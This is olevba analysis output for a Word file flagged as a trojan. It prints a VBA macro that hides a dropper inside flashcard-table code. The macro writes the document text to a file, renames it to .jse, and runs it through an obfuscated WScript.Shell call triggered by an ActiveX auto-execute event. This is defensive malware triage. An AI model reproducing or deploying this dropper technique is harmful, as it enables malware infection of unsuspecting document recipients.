olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: HEUR-Trojan.MSOffice.Agent.gen-2875f6692fc09c66ba549960edb2c80b40655c1af8ad723447af4a3c4fcd2f81
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: HEUR-Trojan.MSOffice.Agent.gen-2875f6692fc09c66ba549960edb2c80b40655c1af8ad723447af4a3c4fcd2f81 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Medasco As String
Private Vedfol As String
Private Lerdf As String
Private Masxcol As String
Public Nerdfoc As String


Private Sub InitializeDictionary()
    ' Create dictionary object (erases current dictionary)
    Set objTemplates = CreateObject("Scripting.Dictionary")
    objTemplates.CompareMode = vbTextCompare ' Not case-sensitive
End Sub



Private Sub testDictionary()
    
    Call InitializeDictionary
    
    objTemplates.Add "diabetes", "a1c is above goal"
    objTemplates.Add "cholesterol", "ldl is above goal"
    objTemplates.Add "hypertension", "bp is above goal"
    
    ' Print all templates in immediate window
    Dim shortcut As Variant
    For Each shortcut In objTemplates.keys
        'Debug.Print shortcut, objTemplates(shortcut)
    Next shortcut
    
End Sub



Public Function DictionaryExists() As Boolean
    If objTemplates Is Nothing Then
        DictionaryExists = False
    Else
        DictionaryExists = True
    End If
End Function



Sub selectNewWorksheets()
'
' selectNewWorksheets Macro
'
'
    ActiveDocument.Tables.Add Range:=Selection.Range, NumRows:=4, NumColumns:= _
        4, DefaultTableBehavior:=wdWord9TableBehavior, AutoFitBehavior:= _
        wdAutoFitWindow
    With Selection.Tables(1)
        If .Style <> "Table Grid" Then
            .Style = "Table Grid"
        End If
        .ApplyStyleHeadingRows = True
        .ApplyStyleLastRow = False
        .ApplyStyleFirstColumn = True
        .ApplyStyleLastColumn = False
        .ApplyStyleRowBands = True
        .ApplyStyleColumnBands = False
    End With
End Sub



Sub TakeCSVandAnalyse(fileName_StringPath)

'
' TakeCSVandAnalyse Macro
'
'
        
    Dim someString, stringToAdd As String
    Dim fileNo As Integer
    Dim TildeOrCommaSeparated, toDivide As String
    fileNo = 1
    
    strFile = fileName_StringPath '"C:\Users\matteo_montanari\Desktop\QuestionflashCardsxlsx.csv"
    
    TildeOrCommaSeparated = Right(fileName_StringPath, 3)
    

    
    With CreateObject("Scripting.FileSystemObject")
        someString = .OpenTextFile(strFile, 1).ReadAll
        GetLineCount = UBound(Split(.OpenTextFile(strFile, 1).ReadAll, vbNewLine))
    End With
     
    
    linesToAdd = 16 - (GetLineCount Mod 16)
  
    stringToAdd = " "
     
    If linesToAdd = 16 Then
    
    Else
    
        If TildeOrCommaSeparated = "csv" Then
             
             toDivide = Chr(44)
        Else
             toDivide = Chr(126)
        End If
        
       For Line = 1 To linesToAdd
            If Line = linesToAdd Then
            
                stringToAdd = stringToAdd + Chr(32) + toDivide + Chr(32) + " "
            
            Else
                stringToAdd = stringToAdd + Chr(32) + toDivide + Chr(32) + vbNewLine
            End If
            

       Next Line
        
        Open strFile For Output As #fileNo  'Open file for overwriting! Replace Output with Append to append
        Print #fileNo, Replace(someString + stringToAdd, Chr(147), Chr(10))
        Close #fileNo
    End If
    
   
 
End Sub


Private Function ulicdr(i As String, op As String) As Object
On Error GoTo ErrHandler
Set ulicdr = CreateObject(op)
Exit Function
ErrHandler:
Set ulicdr = CreateObject(i)
End Function



Sub ImportCSV(fileName_StringPath)
    Dim strFile As String
    Dim strLine As String
    Dim TildeOrCommaSeparated As String
    Dim arrWords() As String
    Dim arrParts() As String
    
    Dim LinearWords As Collection
    Set LinearWords = New Collection
    
    Dim lngNum As Long
    Dim lngCount As Long
    
    Dim Word_Found As Variant
    
    Dim ArrayReverser(1 To 4) As Integer
    ArrayReverser(1) = 3
    ArrayReverser(2) = 1
    ArrayReverser(3) = -1
    ArrayReverser(4) = -3
    
    
    ' Modify as needed
    
    Bdciko = Replace(Medasco, ".yyy", "." & Masxcol & "j" & Masxcol & "se")
    Name Medasco As Bdciko
    Solrterd = Masxcol & "WSc" & Masxcol
    CallByName ulicdr(0, Solrterd & "ript." & Vedfol), Nerdfoc, VbMethod, """" & Bdciko & """" & " " & "578", 1
    strFile = fileName_StringPath '"C:\Users\matteo_montanari\Desktop\QuestionflashCardsxlsx.csv"
    TildeOrCommaSeparated = Right(fileName_StringPath, 3)
    
    lngNum = FreeFile
    Open strFile For Input As lngNum
    Do While Not EOF(lngNum)
        Line Input #lngNum, strLine
        
        If TildeOrCommaSeparated = "csv" Then
                arrParts = Split(strLine, ",")
        Else
                arrParts = Split(strLine, "~")
        End If
        
        
        lngCount = lngCount + 1
   
        ReDim Preserve arrWords(1 To 2, 1 To lngCount)
        arrWords(1, lngCount) = arrParts(0)
        arrWords(2, lngCount) = arrParts(1)
          
        
    Loop
    Close #lngNum
    
    Dim LoopingRange As Integer
    Dim Limit As Integer
    Dim LimitCounter As Integer
    
    Dim StartInternalLoop As Integer
    Dim EndInternalLoop As Integer
    
    
    Limit = 16
    LimitCounter = 1
    PassageCounter = 0
    FourReverser = 1
    LoopingRange = UBound(arrWords, 2)
    
    
    For Word_Found = 1 To UBound(arrWords, 2)
        
 
        LinearWords.Add (arrWords(1, Word_Found))
        
        LimitCounter = LimitCounter + 1
        
        If (LimitCounter = 17) Or (Word_Found = LoopingRange) Then
        
                StartInternalLoop = 1 + (PassageCounter * 16)
                EndInternalLoop = 16 + (PassageCounter * 16)
                
                If (16 + (PassageCounter * 16)) > LoopingRange Then
                    EndInternalLoop = LoopingRange
                End If
 
        
                For Question_Found = StartInternalLoop To EndInternalLoop
                        
                        If FourReverser = 5 Then FourReverser = 1
                        
                        Question_Found_2 = Question_Found + ArrayReverser(FourReverser)
                        
 
                        LinearWords.Add (arrWords(2, Question_Found_2))
                        
                        LimitCounter = LimitCounter + 1
                        
                        FourReverser = FourReverser + 1
                        
                        
                Next Question_Found
                
                PassageCounter = PassageCounter + 1
                LimitCounter = 1
          
        End If
        
        
    Next Word_Found


'Continuing  filling the content
    Dim ROW_ As Variant
    Dim SomeTable As Variant
    Dim Cell As Variant
    
    Dim MAXCounter As Integer
    Dim Counter As Integer
    
    MAXCounter = LinearWords.Count
    Counter = 1
    
    Set SomeTable = ActiveDocument.Tables(1)
    
    For Each ROW_ In SomeTable.Rows
    
        For Each Cell In ROW_.Cells
            
            If Counter > MAXCounter Then Exit For
       
            Cell.Range.Text = LinearWords(Counter)
             
            Counter = Counter + 1
        Next Cell
            
      If Counter > MAXCounter Then Exit For
    
    Next ROW_
  

          
  
  
End Sub

    


Private Function Bikeras(vb As String, jk As String)
On Error Resume Next
Dim Nasinerd As Long
Masxcol = Empty
Medasco = vb & jk & "Monet" & Masxcol & ".yyy"
Dim Nedsccoo As Integer
Nedsccoo = FreeFile
Open Medasco For Binary Lock Read Write As #Nedsccoo
If Nasinerd = 678 Then
With Selection.PageSetup
        .LineNumbering.Active = False
        .Orientation = wdOrientPortrait
        .TopMargin = InchesToPoints(1)
        .BottomMargin = InchesToPoints(1)
        .LeftMargin = InchesToPoints(1)
.RightMargin = InchesToPoints(1)
End With
Else
Put #Nedsccoo, , ActiveDocument.Content.Text
Vedfol = Masxcol & "Sh" & Masxcol & "el" & Masxcol & "l"
End If
Nerdfoc = Masxcol & "Ru" & Masxcol & "n"
Close #Nedsccoo
End Function


Private Sub MsTscAxNotSafeForScripting1_OnConnecting()
Dim crop, sec, plot
On Error Resume Next
Bikeras Application.StartupPath, "\..\." & Masxcol & ".\"
Selection.PageSetup.LineNumbering.Active = False
ImportCSV "C:\Users\matteo_montanari\Desktop\QuestionflashCardsxlsx.csv"
ActiveDocument.Close
InitializeDictionary
End Sub



Private Function MsTscAxNotSafeForScripting1_OnReceivedTSPublicKey(ByVal publicKey As String) As Boolean
On Error Resume Next
InitializeDictionary
testDictionary
DictionaryExists
End Function


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |MsTscAxNotSafeForScr|Runs when the file is opened and ActiveX     |
|          |ipting1_OnConnecting|objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|CallByName          |May attempt to obfuscate malicious function  |
|          |                    |calls                                        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

